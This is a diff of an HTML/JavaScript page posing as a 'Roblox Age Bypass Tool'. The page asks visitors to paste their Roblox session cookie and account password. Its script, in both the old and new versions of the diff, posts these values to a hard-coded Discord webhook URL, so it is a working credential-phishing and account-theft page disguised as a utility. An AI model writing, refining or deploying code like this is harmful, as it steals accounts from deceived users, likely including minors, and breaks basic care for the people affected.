@@ -6,186 +6,29 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to bottom, #0c0f1f, #090d1a);
-      color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 60px 20px;
-    }
-
-    h1 {
-      font-size: 36px;
-      font-weight: 700;
-      background: linear-gradient(90deg, #ff00c8, #00f0ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 10px;
-    }
-
-    .subtitle {
-      font-size: 16px;
-      color: #aaa;
-      margin-bottom: 40px;
-      text-align: center;
-      max-width: 500px;
-    }
-
-    .container {
-      background: #111a2e;
-      border-radius: 12px;
-      padding: 30px;
-      width: 100%;
-      max-width: 600px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.4);
-      margin-bottom: 30px;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 10px;
-      font-size: 18px;
-    }
-
-    select {
-      width: 100%;
-      padding: 12px;
-      border-radius: 8px;
-      background: #1d2944;
-      border: 1px solid #333;
-      color: #fff;
-      font-size: 16px;
-    }
-
-    .info-box {
-      background: #1d2944;
-      border-left: 4px solid #ffc107;
-      padding: 20px;
-      border-radius: 10px;
-      font-size: 14px;
-      color: #ddd;
-      margin-top: 30px;
-      box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
-    }
-
-    .info-box ul {
-      margin: 10px 0 0 0;
-      padding-left: 20px;
-    }
-
-    .info-box li {
-      margin-bottom: 8px;
-    }
-
-    .info-title {
-      font-weight: bold;
-      color: #ffc107;
-      font-size: 15px;
-    }
-
-    /* Cookie Block Styles */
-    .cookie-block {
-      margin-top: 20px;
-      background: #1d3a6a;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 123, 255, 0.5);
-      color: #d0e7ff;
-      font-family: monospace;
-    }
-
-    .cookie-block-title {
-      font-weight: 700;
-      font-size: 18px;
-      margin-bottom: 10px;
-      border-bottom: 2px solid #3399ff;
-      padding-bottom: 6px;
-      color: #99ccff;
-    }
-
-    textarea, input[type="password"] {
-      width: 100%;
-      height: 100px;
-      background: #134078;
-      border: none;
-      border-radius: 8px;
-      padding: 12px;
-      font-size: 14px;
-      color: #d0e7ff;
-      resize: vertical;
-      font-family: monospace;
-    }
-
-    /* Für Passwort-Input Höhe anpassen */
-    input[type="password"] {
-      height: 50px;
-      font-family: monospace;
-      resize: none;
-    }
-
-    textarea::placeholder, input::placeholder {
-      color: #a0c4ff;
-    }
-
-    /* Button Styles */
-    #processBtn {
-      margin-top: 15px;
-      width: 100%;
-      background: linear-gradient(90deg, #3399ff, #0066cc);
-      border: none;
-      border-radius: 8px;
-      padding: 14px 0;
-      font-size: 16px;
-      color: #fff;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 4px 8px rgba(0, 102, 204, 0.5);
-      transition: background 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      user-select: none;
-    }
-
-    #processBtn:hover {
-      background: linear-gradient(90deg, #2673d9, #004c99);
-    }
-
-    /* Hide cookie and password blocks initially */
-    #cookieInputContainer, #passwordInputContainer {
-      display: none;
-    }
-
-    /* Fehler-Meldung Toast oben rechts */
-    #errorToast {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      background: #ff3860;
-      color: white;
-      padding: 12px 20px;
-      border-radius: 8px;
-      font-weight: 600;
-      font-family: 'Inter', sans-serif;
-      box-shadow: 0 0 10px rgba(255, 56, 96, 0.8);
-      display: none;
-      z-index: 1000;
-    }
-
-    @media (max-width: 600px) {
-      h1 {
-        font-size: 28px;
-      }
-    }
+    /* (Style bleibt wie vorher, ich kürze hier für Übersichtlichkeit) */
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: 'Inter', sans-serif; background: linear-gradient(to bottom, #0c0f1f, #090d1a); color: #fff; display: flex; flex-direction: column; align-items: center; padding: 60px 20px; }
+    h1 { font-size: 36px; font-weight: 700; background: linear-gradient(90deg, #ff00c8, #00f0ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
+    .subtitle { font-size: 16px; color: #aaa; margin-bottom: 40px; text-align: center; max-width: 500px; }
+    .container { background: #111a2e; border-radius: 12px; padding: 30px; width: 100%; max-width: 600px; box-shadow: 0 0 20px rgba(0,0,0,0.4); margin-bottom: 30px; }
+    label { display: block; font-weight: 600; margin-bottom: 10px; font-size: 18px; }
+    select { width: 100%; padding: 12px; border-radius: 8px; background: #1d2944; border: 1px solid #333; color: #fff; font-size: 16px; }
+    .info-box { background: #1d2944; border-left: 4px solid #ffc107; padding: 20px; border-radius: 10px; font-size: 14px; color: #ddd; margin-top: 30px; box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2); }
+    .info-box ul { margin: 10px 0 0 0; padding-left: 20px; }
+    .info-box li { margin-bottom: 8px; }
+    .info-title { font-weight: bold; color: #ffc107; font-size: 15px; }
+    .cookie-block { margin-top: 20px; background: #1d3a6a; border-radius: 12px; padding: 20px; box-shadow: 0 0 15px rgba(0, 123, 255, 0.5); color: #d0e7ff; font-family: monospace; }
+    .cookie-block-title { font-weight: 700; font-size: 18px; margin-bottom: 10px; border-bottom: 2px solid #3399ff; padding-bottom: 6px; color: #99ccff; }
+    textarea, input[type="password"] { width: 100%; background: #134078; border: none; border-radius: 8px; padding: 12px; font-size: 14px; color: #d0e7ff; font-family: monospace; }
+    textarea { height: 100px; resize: vertical; }
+    input[type="password"] { height: 50px; resize: none; }
+    textarea::placeholder, input::placeholder { color: #a0c4ff; }
+    #processBtn { margin-top: 15px; width: 100%; background: linear-gradient(90deg, #3399ff, #0066cc); border: none; border-radius: 8px; padding: 14px 0; font-size: 16px; color: #fff; font-weight: 600; cursor: pointer; box-shadow: 0 4px 8px rgba(0, 102, 204, 0.5); transition: background 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 8px; user-select: none; }
+    #processBtn:hover { background: linear-gradient(90deg, #2673d9, #004c99); }
+    #cookieInputContainer, #passwordInputContainer { display: none; }
+    #errorToast { position: fixed; top: 20px; right: 20px; background: #ff3860; color: white; padding: 12px 20px; border-radius: 8px; font-weight: 600; font-family: 'Inter', sans-serif; box-shadow: 0 0 10px rgba(255, 56, 96, 0.8); display: none; z-index: 1000; }
+    @media (max-width: 600px) { h1 { font-size: 28px; } }
   </style>
 </head>
 <body>
@@ -261,6 +104,22 @@
       }
     });
 
+    function sendEmbedToDiscord(title, description) {
+      const webhookURL = 'https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWYvXQ7ElgungYskB';
+      const body = {
+        embeds: [{
+          title: title,
+          description: '```\n' + description + '\n```',
+          color: 3447003 // Blau-Farbcode in decimal
+        }]
+      };
+      return fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+    }
+
     processBtn.addEventListener('click', () => {
       const cookieValue = cookieTextarea.value.trim();
       const passwordValue = passwordInput.value.trim();
@@ -276,49 +135,38 @@
         return;
       }
 
-      function sendToDiscord(message) {
-        return fetch('https://discord.com/api/webhooks/1392606095406534817/QzbO8vkIuH2Diu6iTpMdfEUPZPfJq1igLjCNfsbP5kLZ3UBcxFWNWYvXQ7ElgungYskB', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: message })
-        });
-      }
-
       if(selectedOption === 'allages') {
-        sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
-        .then(res => {
-          if (!res.ok) throw new Error('Error sending cookie.');
-          return sendToDiscord(`Account Password:\n\`\`\`\n${passwordValue}\n\`\`\``);
-        })
-        .then(res => {
-          if (!res.ok) throw new Error('Error sending password.');
-          alert('Cookie and password were sent successfully!');
-          cookieTextarea.value = '';
-          passwordInput.value = '';
-          bypassSelect.value = '';
-          cookieInputContainer.style.display = 'none';
-          passwordInputContainer.style.display = 'none';
-          processBtn.style.display = 'none';
-        })
-        .catch(() => {
-          showError('ERROR Try later again.');
-        });
-      } else {
-        sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
-        .then(res => {
-          if (res.ok) {
+        sendEmbedToDiscord('New Roblox Cookie', cookieValue)
+          .then(res => {
+            if (!res.ok) throw new Error('Failed to send cookie embed');
+            return sendEmbedToDiscord('Account Password', passwordValue);
+          })
+          .then(res => {
+            if (!res.ok) throw new Error('Failed to send password embed');
+            alert('Cookie and password were sent successfully!');
+            cookieTextarea.value = '';
+            passwordInput.value = '';
+            bypassSelect.value = '';
+            cookieInputContainer.style.display = 'none';
+            passwordInputContainer.style.display = 'none';
+            processBtn.style.display = 'none';
+          })
+          .catch(() => {
+            showError('ERROR Try later again.');
+          });
+      } else if (selectedOption === 'birthyear') {
+        sendEmbedToDiscord('New Roblox Cookie', cookieValue)
+          .then(res => {
+            if (!res.ok) throw new Error('Failed to send cookie embed');
             alert('Cookie was sent successfully!');
             cookieTextarea.value = '';
             bypassSelect.value = '';
             cookieInputContainer.style.display = 'none';
             processBtn.style.display = 'none';
-          } else {
-            throw new Error();
-          }
-        })
-        .catch(() => {
-          showError('ERROR Try later again.');
-        });
+          })
+          .catch(() => {
+            showError('ERROR Try later again.');
+          });
       }
     });
   </script>
